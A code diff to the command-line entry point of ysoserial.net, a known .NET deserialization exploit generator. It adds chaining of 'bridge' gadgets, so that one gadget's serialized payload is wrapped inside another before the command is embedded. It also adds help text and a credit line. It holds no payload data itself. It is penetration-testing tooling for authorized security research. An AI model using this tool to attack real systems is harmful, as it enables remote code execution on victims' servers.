@@ -9,6 +9,7 @@ using System.Text;
 using System.Collections.Generic;
 using ysoserial.Helpers;
 using System.Text.RegularExpressions;
+using System.Reflection.Emit;
 
 namespace ysoserial
 {
@@ -18,6 +19,7 @@ namespace ysoserial
         static string outputformat = "";
         static string outputpath = "";
         static string gadget_name = "";
+        static string bridged_gadget_chain = "";
         static string formatter_name = "";
         static string searchFormatter = "";
         static string cmd = "";
@@ -46,6 +48,7 @@ namespace ysoserial
                 {"c|command=", "The command to be executed.", v => cmd = v },
                 {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after first space is an argument).", v => rawcmd =  v != null },
                 {"s|stdin", "The command to be executed will be read from standard input.", v => cmdstdin = v != null },
+                {"bgc|bridgedgadgetchains=", "Chain of bridged gadgets separated by comma (,). Each gadget will be used to complete the next bridge gadget. The last one will be used in the requested gadget. This will be ignored when using the searchformatter argument.", v => bridged_gadget_chain = v },
                 {"t|test", "Whether to run payload locally. Default: false", v => test =  v != null },
                 {"outputpath=", "The output file path. It will be ignored if empty.", v => outputpath = v },
                 {"minify", "Whether to minify the payloads where applicable. Default: false", v => minify =  v != null },
@@ -65,14 +68,15 @@ namespace ysoserial
 
             try
             {
-                List<String> extraArguments = options.Parse(args);
+                List<string> commandArgsExtra = options.Parse(args);
+
                 inputArgs.Cmd = cmd;
                 inputArgs.IsRawCmd = rawcmd;
                 inputArgs.Test = test;
                 inputArgs.Minify = minify;
                 inputArgs.UseSimpleType = useSimpleType;
                 inputArgs.IsDebugMode = isDebugMode;
-                inputArgs.ExtraArguments = extraArguments;
+                inputArgs.ExtraArguments = commandArgsExtra;
             }
             catch (OptionException e)
             {
@@ -169,49 +173,146 @@ namespace ysoserial
             // othersiwe run payload generation
             else if (!isSearchFormatterAndRunMode && (cmd != "" || cmdstdin) && formatter_name != "" && gadget_name != "")
             {
-                if (!generators.Contains(gadget_name, StringComparer.CurrentCultureIgnoreCase))
+                List<string> gadgetsChain = new List<string>();
+
+                if (!string.IsNullOrEmpty(bridged_gadget_chain))
                 {
-                    Console.WriteLine("Gadget not supported. Supported gadgets are: " + string.Join(" , ", generators.OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
-                    System.Environment.Exit(-1);
+                    var bridged_gadget_chain_array = bridged_gadget_chain.Split(',').Where(x => !string.IsNullOrEmpty(x)).ToList();
+
+                    gadgetsChain.AddRange(bridged_gadget_chain_array);
                 }
 
-                // Instantiate Payload Generator
-                IGenerator generator = null;
-                try
+                gadgetsChain.Add(gadget_name);
+
+                if (isDebugMode)
                 {
-                    gadget_name = generators.Where(p => String.Equals(p, gadget_name, StringComparison.OrdinalIgnoreCase)).FirstOrDefault();
-                    var container = Activator.CreateInstance(null, "ysoserial.Generators." + gadget_name + "Generator");
-                    generator = (IGenerator)container.Unwrap();
-                }
-                catch
-                {
-                    Console.WriteLine("Gadget not supported!");
-                    System.Environment.Exit(-1);
+                    Console.WriteLine("Current gadget chain: " + string.Join(" -> ", gadgetsChain));
                 }
 
-                // Check Generator supports specified formatter
-                if (generator.IsSupported(formatter_name))
+                if (cmd == "" && cmdstdin)
                 {
-                    if (cmd == "" && cmdstdin)
+                    Stream stdin = Console.OpenStandardInput(2050);
+                    byte[] inBuffer = new byte[2050];
+                    int outLen = stdin.Read(inBuffer, 0, inBuffer.Length);
+                    char[] chars = Encoding.UTF7.GetChars(inBuffer, 0, outLen);
+                    cmd = new string(chars);
+                    if ((cmd[cmd.Length - 2] == '\r') && (cmd[cmd.Length - 1] == '\n'))
                     {
-                        Stream stdin = Console.OpenStandardInput(2050);
-                        byte[] inBuffer = new byte[2050];
-                        int outLen = stdin.Read(inBuffer, 0, inBuffer.Length);
-                        char[] chars = Encoding.UTF7.GetChars(inBuffer, 0, outLen);
-                        cmd = new string(chars);
-                        if ((cmd[cmd.Length - 2] == '\r') && (cmd[cmd.Length - 1] == '\n'))
-                        {
-                            cmd = cmd.Substring(0,cmd.Length-2);
-                        }
-                        inputArgs.Cmd = cmd;
+                        cmd = cmd.Substring(0, cmd.Length - 2);
                     }
-                    raw = generator.GenerateWithInit(formatter_name, inputArgs);
+                    inputArgs.Cmd = cmd;
                 }
-                else
+
+                for (int i = 0; i < gadgetsChain.Count; i++)
                 {
-                    Console.WriteLine("Formatter not supported. Supported formatters are: " + string.Join(" , ", generator.SupportedFormatters().OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
-                    System.Environment.Exit(-1);
+                    string current_gadget_name = gadgetsChain[i];
+                    string consumer_gadget_name = "";
+                    string current_formatter_name = "";
+
+                    if (i < gadgetsChain.Count - 1)
+                    {
+                        // this is not the last one so it has a consumer and 'current_gadget_name' should be a bridge gadget!
+                        consumer_gadget_name = gadgetsChain[i + 1];
+
+                    }
+                    else
+                    {
+                        // the provided formatter from the user input should only be used for the last item in the chain
+                        // bridges should know what they need to pass it on
+                        current_formatter_name = formatter_name;
+                    }
+
+                    if (!generators.Contains(current_gadget_name, StringComparer.CurrentCultureIgnoreCase))
+                    {
+                        Console.WriteLine("Gadget " + current_gadget_name  + " not supported. Supported gadgets are: " + string.Join(" , ", generators.OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
+                        System.Environment.Exit(-1);
+                    }
+
+                    // Instantiate Payload Generator
+                    IGenerator generator = null;
+                    try
+                    {
+                        current_gadget_name = generators.Where(p => String.Equals(p, current_gadget_name, StringComparison.OrdinalIgnoreCase)).FirstOrDefault();
+                        var container = Activator.CreateInstance(null, "ysoserial.Generators." + current_gadget_name + "Generator");
+                        generator = (IGenerator)container.Unwrap();
+                    }
+                    catch
+                    {
+                        Console.WriteLine("Gadget " + current_gadget_name + " not supported!");
+                        System.Environment.Exit(-1);
+                    }
+
+                    if (!string.IsNullOrEmpty(consumer_gadget_name))
+                    {
+                        // we have a consumer which has its own requirements and we need to check them to be satisfied
+                        // first we need to check whether we have a valid consumer
+                        if (!generators.Contains(consumer_gadget_name, StringComparer.CurrentCultureIgnoreCase))
+                        {
+                            Console.WriteLine("Bridged gadget " + consumer_gadget_name + " not supported. Supported gadgets are: " + string.Join(" , ", generators.OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
+                            Console.WriteLine("Current supplied gadget chain: " + string.Join(" -> ", gadgetsChain));
+                            System.Environment.Exit(-1);
+                        }
+
+                        // Instantiate The Bridged Gadget
+                        IGenerator consumer_gadget = null;
+                        try
+                        {
+                            consumer_gadget_name = generators.Where(p => String.Equals(p, consumer_gadget_name, StringComparison.OrdinalIgnoreCase)).FirstOrDefault();
+                            var container = Activator.CreateInstance(null, "ysoserial.Generators." + consumer_gadget_name + "Generator");
+                            consumer_gadget = (IGenerator)container.Unwrap();
+                        }
+                        catch
+                        {
+                            Console.WriteLine("Bridged gadget " + consumer_gadget_name + " not supported!");
+                            Console.WriteLine("Current supplied gadget chain: " + string.Join(" -> ", gadgetsChain));
+                            System.Environment.Exit(-1);
+                        }
+
+
+                        if (!consumer_gadget.Labels().Contains(GadgetTypes.BridgeAndDerived))
+                        {
+                            Console.WriteLine("The " + consumer_gadget.Name() + " gadget is not a bridge gadget and it cannot accept another gadget.");
+                            Console.WriteLine("Current supplied gadget chain: " + string.Join(" -> ", gadgetsChain));
+                            System.Environment.Exit(-1);
+                        }
+
+                        if (string.IsNullOrEmpty(consumer_gadget.SupportedBridgedFormatter()))
+                        {
+                            Console.WriteLine("The " + consumer_gadget.Name() + " gadget does not specify a formatter for the bridge");
+                            Console.WriteLine("Current supplied gadget chain: " + string.Join(" -> ", gadgetsChain));
+                            System.Environment.Exit(-1);
+                        }
+
+                        current_formatter_name = consumer_gadget.SupportedBridgedFormatter();
+                    }
+
+                    if (!generator.IsSupported(current_formatter_name))
+                    {
+                        Console.WriteLine("Formatter " + current_formatter_name + " not supported by " + generator.Name() + ". Supported formatters are: " + string.Join(" , ", generator.SupportedFormatters().OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
+                        System.Environment.Exit(-1);
+                    }
+
+                    if (i > 0)
+                    {
+                        generator.BridgedPayload = raw;
+                    }
+
+                    if(i == gadgetsChain.Count - 1)
+                    {
+                        raw = generator.GenerateWithInit(current_formatter_name, inputArgs);
+                    }
+                    else
+                    {
+                        // we do not need to run the payload when building the bridges unless it is the last one
+                        InputArgs tempInputArgs = inputArgs.DeepCopy();
+                        tempInputArgs.Test = false;
+                        raw = generator.GenerateWithInit(current_formatter_name, tempInputArgs);
+                    }
+
+                    
                 }
+
+                
 
                 // LosFormatter is already base64 encoded
                 if (outputformat.ToLower().Equals("base64") && formatter_name.ToLower().Equals("losformatter"))
@@ -552,6 +653,11 @@ namespace ysoserial
                             if (show_fullhelp)
                             {
                                 Console.WriteLine("\t\t\tLabels: " + string.Join(", ", gg.Labels()));
+
+                                if (gg.Labels().Contains(GadgetTypes.BridgeAndDerived) && !string.IsNullOrEmpty(gg.SupportedBridgedFormatter()))
+                                {
+                                    Console.WriteLine("\t\t\tSupported formatter for the bridge: " + gg.SupportedBridgedFormatter());
+                                }
                             }
 
                             if (extraOptions != null && show_fullhelp)
@@ -635,6 +741,7 @@ namespace ysoserial
         private static void ShowCredit()
         {
             Console.WriteLine("ysoserial.net has been originally developed by Alvaro Muñoz (@pwntester)");
+            Console.WriteLine("this tool is being maintained by Alvaro Muñoz (@pwntester) and Soroush Dalili (@irsdl)");
             Console.WriteLine("");
             Console.WriteLine("Credits for available gadgets:");
             foreach (string g in generators)
